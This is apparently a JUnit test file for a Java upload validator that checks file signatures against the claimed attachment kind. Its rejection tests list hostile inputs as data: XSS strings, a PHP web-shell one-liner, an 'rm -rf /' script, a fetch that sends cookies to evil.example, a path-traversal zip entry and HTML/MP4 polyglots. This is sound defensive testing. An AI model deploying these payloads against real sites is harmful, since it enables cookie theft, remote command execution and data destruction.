package com.nukkad.common.storage;

import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;
import java.util.Arrays;

import static com.nukkad.common.storage.FileStorageService.AttachmentKind.FILE;
import static com.nukkad.common.storage.FileStorageService.AttachmentKind.IMAGE;
import static com.nukkad.common.storage.FileStorageService.AttachmentKind.PDF;
import static com.nukkad.common.storage.FileStorageService.AttachmentKind.VIDEO;
import static org.assertj.core.api.Assertions.assertThat;

class AttachmentContentValidatorTest {

    private static final byte[] PNG = {(byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 0};
    private static final byte[] JPEG = {(byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0, 0, 0, 0, 0, 0, 0, 0, 0};
    private static final byte[] GIF = "GIF89a-----".getBytes();
    private static final byte[] WEBP = {'R', 'I', 'F', 'F', 0, 0, 0, 0, 'W', 'E', 'B', 'P'};
    private static final byte[] RIFF_BUT_NOT_WEBP = {'R', 'I', 'F', 'F', 0, 0, 0, 0, 'W', 'A', 'V', 'E'};
    private static final byte[] MP4 = {0, 0, 0, 0x18, 'f', 't', 'y', 'p', 'i', 's', 'o', 'm'};
    private static final byte[] PDF_BYTES = "%PDF-1.4\n\n\n\n".getBytes();
    private static final byte[] OLE2 = {(byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0, (byte) 0xA1, (byte) 0xB1, 0x1A, (byte) 0xE1, 0, 0, 0, 0};
    private static final byte[] EXE = {'M', 'Z', (byte) 0x90, 0, 3, 0, 0, 0, 4, 0, 0, 0};
    private static final byte[] EMPTY = {};

    /** A real WebM's EBML header: magic, then the DocType element carrying "webm". */
    private static final byte[] WEBM = {0x1A, 0x45, (byte) 0xDF, (byte) 0xA3, (byte) 0x9F, 0x42, (byte) 0x86, (byte) 0x81, 0x01,
            0x42, (byte) 0xF7, (byte) 0x81, 0x01, 0x42, (byte) 0xF2, (byte) 0x81, 0x04, 0x42, (byte) 0xF3, (byte) 0x81, 0x08,
            0x42, (byte) 0x82, (byte) 0x84, 'w', 'e', 'b', 'm'};
    /** The same header but a generic Matroska (.mkv) DocType. */
    private static final byte[] MATROSKA = {0x1A, 0x45, (byte) 0xDF, (byte) 0xA3, (byte) 0x9F, 0x42, (byte) 0x86, (byte) 0x81, 0x01,
            0x42, (byte) 0x82, (byte) 0x88, 'm', 'a', 't', 'r', 'o', 's', 'k', 'a'};

    private static final long PLENTY = 10L * 1024 * 1024;

    private boolean matches(byte[] header, FileStorageService.AttachmentKind kind) {
        return AttachmentContentValidator.matches(header, header.length, PLENTY, kind);
    }

    /** A ZIP whose first local file header names {@code firstEntry} — the only part of the zip the validator reads. */
    private static byte[] zipStartingWith(String firstEntry) {
        byte[] name = firstEntry.getBytes(StandardCharsets.UTF_8);
        byte[] header = new byte[30 + name.length];
        header[0] = 0x50;
        header[1] = 0x4B;
        header[2] = 0x03;
        header[3] = 0x04;
        header[26] = (byte) (name.length & 0xFF);
        header[27] = (byte) ((name.length >> 8) & 0xFF);
        System.arraycopy(name, 0, header, 30, name.length);
        return header;
    }

    @Test
    void recognizesEveryAllowedImageFormat() {
        assertThat(matches(PNG, IMAGE)).isTrue();
        assertThat(matches(JPEG, IMAGE)).isTrue();
        assertThat(matches(GIF, IMAGE)).isTrue();
        assertThat(matches(WEBP, IMAGE)).isTrue();
    }

    @Test
    void webpRequiresBothTheRiffAndWebpMarkersNotJustRiff() {
        // RIFF alone is shared with WAV/AVI — bytes 8-11 must actually say "WEBP".
        assertThat(matches(RIFF_BUT_NOT_WEBP, IMAGE)).isFalse();
    }

    @Test
    void recognizesEveryAllowedVideoFormat() {
        assertThat(matches(MP4, VIDEO)).isTrue();
        assertThat(matches(WEBM, VIDEO)).isTrue();
    }

    @Test
    void recognizesPdf() {
        assertThat(matches(PDF_BYTES, PDF)).isTrue();
    }

    @Test
    void recognizesBothLegacyOle2AndModernOoxmlOfficeDocuments() {
        assertThat(matches(OLE2, FILE)).isTrue();
        assertThat(matches(zipStartingWith("[Content_Types].xml"), FILE)).isTrue();
    }

    @Test
    void anExecutableIsNeverAcceptedAsAnyAllowedKindRegardlessOfWhatItClaimsToBe() {
        assertThat(matches(EXE, IMAGE)).isFalse();
        assertThat(matches(EXE, VIDEO)).isFalse();
        assertThat(matches(EXE, PDF)).isFalse();
        assertThat(matches(EXE, FILE)).isFalse();
    }

    @Test
    void bytesForOneKindDoNotMatchAnotherClaimedKind() {
        // A real PDF renamed/relabeled to claim it's an image, video or Office document.
        assertThat(matches(PDF_BYTES, IMAGE)).isFalse();
        assertThat(matches(PDF_BYTES, VIDEO)).isFalse();
        assertThat(matches(PDF_BYTES, FILE)).isFalse();
    }

    @Test
    void anEmptyOrTooShortHeaderNeverMatchesAnything() {
        assertThat(matches(EMPTY, IMAGE)).isFalse();
        assertThat(matches(EMPTY, VIDEO)).isFalse();
        assertThat(matches(EMPTY, PDF)).isFalse();
        assertThat(matches(EMPTY, FILE)).isFalse();
    }

    // ---- Script / markup payloads dressed up as media ----

    @Test
    void htmlAndScriptContentNeverPassesAsAnyKindWhateverItsFileNameSays() {
        for (String text : new String[] {
                "<!DOCTYPE html><html><script>alert(1)</script>",
                "<html><body onload=alert(1)>",
                "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
                "#!/bin/sh\nrm -rf /\n",
                "<?php system($_GET['c']); ?>",
                "<script>fetch('//evil.example/'+document.cookie)</script>"}) {
            byte[] bytes = text.getBytes(StandardCharsets.UTF_8);
            for (FileStorageService.AttachmentKind kind : FileStorageService.AttachmentKind.values()) {
                assertThat(matches(bytes, kind)).as("%s as %s", text, kind).isFalse();
            }
        }
    }

    @Test
    void aTextFileWhoseBytesHappenToSpellAnMp4BoxTypeIsNotAVideo() {
        // Bytes 4-7 read "ftyp" (and "moov"/"free"/...), but the first four bytes — the box SIZE — are ordinary
        // text, i.e. hundreds of MB to billions: bigger than the file, so this can't be a real MP4/MOV box.
        for (String boxType : new String[] {"ftyp", "moov", "mdat", "free", "skip", "wide"}) {
            byte[] polyglot = ("<!--" + boxType + "isom--><script>alert(1)</script>").getBytes(StandardCharsets.UTF_8);
            assertThat(AttachmentContentValidator.matches(polyglot, polyglot.length, polyglot.length, VIDEO))
                    .as("html polyglot with %s at offset 4", boxType).isFalse();
        }
        byte[] leadingNewlines = "\n\n\n\nftypisom<script>".getBytes(StandardCharsets.UTF_8);
        assertThat(AttachmentContentValidator.matches(leadingNewlines, leadingNewlines.length, leadingNewlines.length, VIDEO)).isFalse();
    }

    @Test
    void anMp4BoxThatClaimsToBeLargerThanTheWholeFileIsRejected() {
        byte[] header = {0x00, 0x10, 0x00, 0x00, 'f', 't', 'y', 'p', 'i', 's', 'o', 'm'}; // declares a 1 MiB first box
        assertThat(AttachmentContentValidator.matches(header, header.length, 500, VIDEO)).isFalse();
        assertThat(AttachmentContentValidator.matches(header, header.length, 5L * 1024 * 1024, VIDEO)).isFalse(); // ftyp is tiny in any real file
    }

    @Test
    void anFtypBoxNeedsAPrintableBrandAndLegacyQuickTimeFirstBoxesAreStillAccepted() {
        byte[] binaryBrand = {0, 0, 0, 0x18, 'f', 't', 'y', 'p', 0x01, 0x02, 0x03, 0x04};
        assertThat(matches(binaryBrand, VIDEO)).isFalse();
        byte[] quickTimeBrand = {0, 0, 0, 0x14, 'f', 't', 'y', 'p', 'q', 't', ' ', ' '};
        assertThat(matches(quickTimeBrand, VIDEO)).isTrue();
        byte[] legacyMoovFirst = {0, 0, 0x02, 0x00, 'm', 'o', 'o', 'v', 0, 0, 0, 0};
        assertThat(matches(legacyMoovFirst, VIDEO)).isTrue();
    }

    @Test
    void genericMatroskaIsNotAcceptedAsWebm() {
        assertThat(matches(MATROSKA, VIDEO)).isFalse();
    }

    // ---- ZIP-based content: only a real Office Open XML package is a Word/Excel/PowerPoint file ----

    @Test
    void anOoxmlPackageIsAcceptedWhicheverStandardPartItStartsWith() {
        for (String first : new String[] {"[Content_Types].xml", "_rels/.rels", "docProps/app.xml", "word/document.xml",
                "xl/workbook.xml", "ppt/presentation.xml", "customXml/item1.xml"}) {
            assertThat(matches(zipStartingWith(first), FILE)).as(first).isTrue();
        }
    }

    @Test
    void anArbitraryZipJarOrApkRenamedToADocumentIsRejected() {
        for (String first : new String[] {"META-INF/MANIFEST.MF", "AndroidManifest.xml", "classes.dex", "evil.exe", "payload.js",
                "index.html", "a.txt", "../../etc/passwd", "[Content_Types].xml.exe"}) {
            assertThat(matches(zipStartingWith(first), FILE)).as(first).isFalse();
        }
        // A bare signature with no entry name at all is not a package either.
        assertThat(matches(new byte[] {0x50, 0x4B, 0x03, 0x04, 0, 0, 0, 0, 0, 0, 0, 0}, FILE)).isFalse();
    }

    @Test
    void aZipIsNeverAcceptedAsAnImageVideoOrPdf() {
        byte[] zip = zipStartingWith("[Content_Types].xml");
        assertThat(matches(zip, IMAGE)).isFalse();
        assertThat(matches(zip, VIDEO)).isFalse();
        assertThat(matches(zip, PDF)).isFalse();
    }

    @Test
    void aHeaderWindowLongerThanTheFileItselfIsHandled() {
        byte[] shortFile = Arrays.copyOf(PNG, 6);
        assertThat(AttachmentContentValidator.matches(shortFile, shortFile.length, shortFile.length, IMAGE)).isFalse();
    }
}
